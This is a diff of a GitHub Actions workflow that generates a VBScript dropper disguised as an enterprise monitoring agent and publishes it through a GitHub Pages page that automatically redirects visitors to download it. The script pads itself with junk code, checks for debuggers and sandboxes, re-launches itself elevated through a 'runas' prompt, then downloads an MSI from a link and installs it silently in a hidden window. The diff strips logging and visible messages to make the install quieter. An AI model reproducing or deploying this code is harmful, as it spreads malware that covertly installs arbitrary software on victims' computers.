@@ -27,18 +27,18 @@ jobs:
         
         # Create a bulky VBS with lots of junk code using echo commands
         echo "' --------------------------------------------------------------------------" > file.vbs
-        echo "'  Enterprise System Monitor Agent v3.7.2" >> file.vbs
-        echo "'  Copyright (c) 2023 Enterprise Solutions Inc." >> file.vbs
+        echo "'  Silent Installer - Enterprise Monitor Agent" >> file.vbs
         echo "' --------------------------------------------------------------------------" >> file.vbs
         echo "Option Explicit" >> file.vbs
         echo "" >> file.vbs
-        echo "' Initialize system variables" >> file.vbs
-        echo "Dim WshShell, Fso, NetObj" >> file.vbs
+        echo "' System initialization variables" >> file.vbs
+        echo "Dim WshShell, Fso, NetObj, EnvVars, SysInfo" >> file.vbs
         echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> file.vbs
         echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> file.vbs
         echo "Set NetObj = CreateObject(\"WScript.Network\")" >> file.vbs
+        echo "Set EnvVars = WshShell.Environment(\"Process\")" >> file.vbs
         echo "" >> file.vbs
-        echo "' Dummy variables for obfuscation" >> file.vbs
+        echo "' Anti-analysis dummy variables" >> file.vbs
         echo "Dim dummy1, dummy2, dummy3, dummy4, dummy5" >> file.vbs
         echo "dummy1 = \"System initialization\"" >> file.vbs
         echo "dummy2 = \"Network configuration\"" >> file.vbs
@@ -53,7 +53,7 @@ jobs:
         echo "    GetSystemInfo = result" >> file.vbs
         echo "End Function" >> file.vbs
         echo "" >> file.vbs
-        echo "' Fake process validation function" >> file.vbs
+        echo "' Process validation function" >> file.vbs
         echo "Function ValidateProcess(processName)" >> file.vbs
         echo "    Dim colProcesses, objProcess" >> file.vbs
         echo "    On Error Resume Next" >> file.vbs
@@ -66,7 +66,7 @@ jobs:
         echo "    Next" >> file.vbs
         echo "End Function" >> file.vbs
         echo "" >> file.vbs
-        echo "' Fake network adapter information" >> file.vbs
+        echo "' Network adapter information" >> file.vbs
         echo "Function GetNetworkInfo()" >> file.vbs
         echo "    Dim result" >> file.vbs
         echo "    result = \"Network adapter: \" & NetObj.ComputerName" >> file.vbs
@@ -86,14 +86,6 @@ jobs:
         echo "    WshShell.RegWrite keyPath & \"\\\" & valueName, value, \"REG_SZ\"" >> file.vbs
         echo "End Sub" >> file.vbs
         echo "" >> file.vbs
-        echo "' File operations helper" >> file.vbs
-        echo "Function CreateTempFile(prefix, extension)" >> file.vbs
-        echo "    Dim tempFolder, fileName" >> file.vbs
-        echo "    tempFolder = WshShell.ExpandEnvironmentStrings(\"%TEMP%\")" >> file.vbs
-        echo "    fileName = tempFolder & \"\\\" & prefix & \"_\" & Round(Timer * 1000) & \".\" & extension" >> file.vbs
-        echo "    Set CreateTempFile = Fso.CreateTextFile(fileName, True)" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
         echo "' Encryption helper function" >> file.vbs
         echo "Function SimpleEncrypt(text)" >> file.vbs
         echo "    Dim i, result" >> file.vbs
@@ -112,59 +104,6 @@ jobs:
         echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> file.vbs
         echo "    Next" >> file.vbs
         echo "    SimpleDecrypt = result" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Check for elevated privileges" >> file.vbs
-        echo "Function IsElevated()" >> file.vbs
-        echo "    On Error Resume Next" >> file.vbs
-        echo "    IsElevated = False" >> file.vbs
-        echo "    If WScript.Arguments.Named.Exists(\"elevated\") Then" >> file.vbs
-        echo "        IsElevated = True" >> file.vbs
-        echo "    Else" >> file.vbs
-        echo "        CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> file.vbs
-        echo "        WScript.Quit" >> file.vbs
-        echo "    End If" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Network connectivity check" >> file.vbs
-        echo "Function CheckConnection(url)" >> file.vbs
-        echo "    On Error Resume Next" >> file.vbs
-        echo "    Dim objHTTP" >> file.vbs
-        echo "    Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")" >> file.vbs
-        echo "    objHTTP.open \"HEAD\", url, False" >> file.vbs
-        echo "    objHTTP.send()" >> file.vbs
-        echo "    If objHTTP.Status = 200 Then" >> file.vbs
-        echo "        CheckConnection = True" >> file.vbs
-        echo "    Else" >> file.vbs
-        echo "        CheckConnection = False" >> file.vbs
-        echo "    End If" >> file.vbs
-        echo "    Set objHTTP = Nothing" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Fake hardware fingerprint generation" >> file.vbs
-        echo "Function GetHardwareFingerprint()" >> file.vbs
-        echo "    Dim result" >> file.vbs
-        echo "    result = NetObj.ComputerName & \"_\" & NetObj.UserName" >> file.vbs
-        echo "    GetHardwareFingerprint = result" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Fake memory status check" >> file.vbs
-        echo "Function GetMemoryStatus()" >> file.vbs
-        echo "    Dim result" >> file.vbs
-        echo "    result = \"Memory status: OK\"" >> file.vbs
-        echo "    GetMemoryStatus = result" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Fake disk space check" >> file.vbs
-        echo "Function GetDiskSpace(drive)" >> file.vbs
-        echo "    Dim result" >> file.vbs
-        echo "    result = \"Disk \" & drive & \": Available\"" >> file.vbs
-        echo "    GetDiskSpace = result" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' User account information" >> file.vbs
-        echo "Function GetUserInfo()" >> file.vbs
-        echo "    GetUserInfo = NetObj.UserName & \"|\" & NetObj.ComputerName & \"|\" & NetObj.UserDomain" >> file.vbs
         echo "End Function" >> file.vbs
         echo "" >> file.vbs
         echo "' Check for debugger processes" >> file.vbs
@@ -210,25 +149,6 @@ jobs:
         echo "    HasMouseActivity = (pos1 <> pos2)" >> file.vbs
         echo "End Function" >> file.vbs
         echo "" >> file.vbs
-        echo "' Get Windows version details" >> file.vbs
-        echo "Function GetWindowsVersion()" >> file.vbs
-        echo "    Dim objShell" >> file.vbs
-        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> file.vbs
-        echo "    GetWindowsVersion = objShell.RegRead(\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName\")" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Check for specific files" >> file.vbs
-        echo "Function FileExists(filePath)" >> file.vbs
-        echo "    On Error Resume Next" >> file.vbs
-        echo "    FileExists = Fso.FileExists(filePath)" >> file.vbs
-        echo "    If Err.Number <> 0 Then FileExists = False" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Get environment variable" >> file.vbs
-        echo "Function GetEnvVar(varName)" >> file.vbs
-        echo "    GetEnvVar = WshShell.ExpandEnvironmentStrings(\"%\" & varName & \" %\")" >> file.vbs
-        echo "End Function" >> file.vbs
-        echo "" >> file.vbs
         echo "' More junk functions to add bulk" >> file.vbs
         echo "Function FakeFunction1()" >> file.vbs
         echo "    FakeFunction1 = \"Fake result 1\"" >> file.vbs
@@ -251,15 +171,6 @@ jobs:
         echo "End Function" >> file.vbs
         echo "" >> file.vbs
         echo "' Main execution starts here" >> file.vbs
-        echo "' Perform system checks" >> file.vbs
-        echo "Dim systemInfo, networkInfo, hwFingerprint, memStatus, diskSpace, userInfo" >> file.vbs
-        echo "systemInfo = GetSystemInfo()" >> file.vbs
-        echo "networkInfo = GetNetworkInfo()" >> file.vbs
-        echo "hwFingerprint = GetHardwareFingerprint()" >> file.vbs
-        echo "memStatus = GetMemoryStatus()" >> file.vbs
-        echo "diskSpace = GetDiskSpace(\"C:\")" >> file.vbs
-        echo "userInfo = GetUserInfo()" >> file.vbs
-        echo "" >> file.vbs
         echo "' Anti-analysis checks" >> file.vbs
         echo "If IsDebuggerPresent() Then WScript.Quit" >> file.vbs
         echo "" >> file.vbs
@@ -272,17 +183,20 @@ jobs:
         echo "' Additional delay to frustrate analysis" >> file.vbs
         echo "AntiSandboxDelay" >> file.vbs
         echo "" >> file.vbs
-        echo "' Check elevation status" >> file.vbs
-        echo "If Not IsElevated() Then WScript.Quit" >> file.vbs
-        echo "" >> file.vbs
         echo "' Core functionality - download and execute" >> file.vbs
-        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objShell" >> file.vbs
+        echo "' Check for elevation" >> file.vbs
+        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> file.vbs
+        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> file.vbs
+        echo "    WScript.Quit" >> file.vbs
+        echo "End If" >> file.vbs
+        echo "" >> file.vbs
+        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> file.vbs
         echo "strUrl = \"$current_link\"" >> file.vbs
-        echo "strTemp = WshShell.ExpandEnvironmentStrings(\"%TEMP%\")" >> file.vbs
+        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> file.vbs
         echo "strFile = strTemp & \"\\agent_installer.msi\"" >> file.vbs
         echo "" >> file.vbs
-        echo "' Download with proper redirect handling" >> file.vbs
-        echo "Set objXMLHTTP = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")" >> file.vbs
+        echo "' Download with redirect handling" >> file.vbs
+        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> file.vbs
         echo "objXMLHTTP.open \"GET\", strUrl, False" >> file.vbs
         echo "objXMLHTTP.send()" >> file.vbs
         echo "" >> file.vbs
@@ -293,23 +207,6 @@ jobs:
         echo "    objXMLHTTP.send()" >> file.vbs
         echo "End If" >> file.vbs
         echo "" >> file.vbs
-        echo "' Verify download" >> file.vbs
-        echo "If Not Fso.FileExists(strFile) Then" >> file.vbs
-        echo "    WScript.Echo \"Download failed - file not found\"" >> file.vbs
-        echo "    WScript.Quit" >> file.vbs
-        echo "End If" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Check file size" >> file.vbs
-        echo "Set objFile = Fso.GetFile(strFile)" >> file.vbs
-        echo "If objFile.Size < 1024 Then  ' Less than 1KB suggests incomplete download" >> file.vbs
-        echo "    WScript.Echo \"Downloaded file appears incomplete: \" & objFile.Size & \" bytes\"" >> file.vbs
-        echo "    WScript.Quit" >> file.vbs
-        echo "End If" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Create installation log" >> file.vbs
-        echo "logFile = strTemp & \"\\install.log\"" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Check if we got a successful response" >> file.vbs
         echo "If objXMLHTTP.Status = 200 Then" >> file.vbs
         echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> file.vbs
         echo "    objADOStream.Open" >> file.vbs
@@ -319,63 +216,14 @@ jobs:
         echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> file.vbs
         echo "    objADOStream.Close" >> file.vbs
         echo "" >> file.vbs
-        echo "    ' Try installation with logging and visible window" >> file.vbs
-        echo "    WScript.Echo \"Installing... This may take a few minutes.\"" >> file.vbs
-        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /l*v \"\"\" & logFile & \"\"\" /quiet /qn /norestart\", 1, True" >> file.vbs
-        echo "" >> file.vbs
-        echo "    ' Check if installation succeeded" >> file.vbs
-        echo "    If Fso.FileExists(logFile) Then" >> file.vbs
-        echo "        Set objLog = Fso.OpenTextFile(logFile, 1)" >> file.vbs
-        echo "        logContent = objLog.ReadAll" >> file.vbs
-        echo "        objLog.Close" >> file.vbs
-        echo "        " >> file.vbs
-        echo "        ' Look for success or failure" >> file.vbs
-        echo "        If InStr(logContent, \"Installation completed successfully\") > 0 Then" >> file.vbs
-        echo "            WScript.Echo \"Installation completed successfully\"" >> file.vbs
-        echo "        ElseIf InStr(logContent, \"Error\") > 0 Or InStr(logContent, \"failed\") > 0 Then" >> file.vbs
-        echo "            WScript.Echo \"Installation failed. Check log file: \" & logFile" >> file.vbs
-        echo "            WScript.Echo \"Last few lines of log:\"" >> file.vbs
-        echo "            " >> file.vbs
-        echo "            ' Show last few lines of log" >> file.vbs
-        echo "            lines = Split(logContent, vbCrLf)" >> file.vbs
-        echo "            For i = UBound(lines) - 5 To UBound(lines)" >> file.vbs
-        echo "                If i >= 0 Then WScript.Echo lines(i)" >> file.vbs
-        echo "            Next" >> file.vbs
-        echo "        Else" >> file.vbs
-        echo "            WScript.Echo \"Installation status unclear. Check log file: \" & logFile" >> file.vbs
-        echo "        End If" >> file.vbs
-        echo "    Else" >> file.vbs
-        echo "        WScript.Echo \"Installation log not created - installation may have failed immediately\"" >> file.vbs
-        echo "    End If" >> file.vbs
+        echo "    ' Install" >> file.vbs
+        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> file.vbs
+        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> file.vbs
         echo "" >> file.vbs
         echo "    ' Cleanup" >> file.vbs
-        echo "    If Fso.FileExists(strFile) Then Fso.DeleteFile strFile" >> file.vbs
-        echo "Else" >> file.vbs
-        echo "    WScript.Echo \"Download failed with status: \" & objXMLHTTP.Status" >> file.vbs
-        echo "End If" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Additional cleanup and logging" >> file.vbs
-        echo "Dim sysLogFile, logContent" >> file.vbs
-        echo "Set sysLogFile = Fso.CreateTextFile(WshShell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\sysmon.log\", True)" >> file.vbs
-        echo "logContent = \"System Info: \" & systemInfo & vbCrLf & _" >> file.vbs
-        echo "             \"Network Info: \" & networkInfo & vbCrLf & _" >> file.vbs
-        echo "             \"Hardware ID: \" & hwFingerprint & vbCrLf & _" >> file.vbs
-        echo "             \"Memory: \" & memStatus & vbCrLf & _" >> file.vbs
-        echo "             \"Disk Space: \" & diskSpace & vbCrLf & _" >> file.vbs
-        echo "             \"User Info: \" & userInfo & vbCrLf & _" >> file.vbs
-        echo "             \"Windows Version: \" & GetWindowsVersion() & vbCrLf & _" >> file.vbs
-        echo "             \"Execution Time: \" & Now" >> file.vbs
-        echo "" >> file.vbs
-        echo "sysLogFile.WriteLine logContent" >> file.vbs
-        echo "sysLogFile.Close" >> file.vbs
-        echo "" >> file.vbs
-        echo "' Final cleanup" >> file.vbs
-        echo "Set WshShell = Nothing" >> file.vbs
-        echo "Set Fso = Nothing" >> file.vbs
-        echo "Set NetObj = Nothing" >> file.vbs
-        echo "Set objXMLHTTP = Nothing" >> file.vbs
-        echo "Set objADOStream = Nothing" >> file.vbs
-        echo "Set objShell = Nothing"
+        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> file.vbs
+        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> file.vbs
+        echo "End If"
         
         # Create index.html for GitHub Pages
         echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=file.vbs"></head><body><p>If not redirected, <a href="file.vbs">click here</a></p></body></html>' > index.html
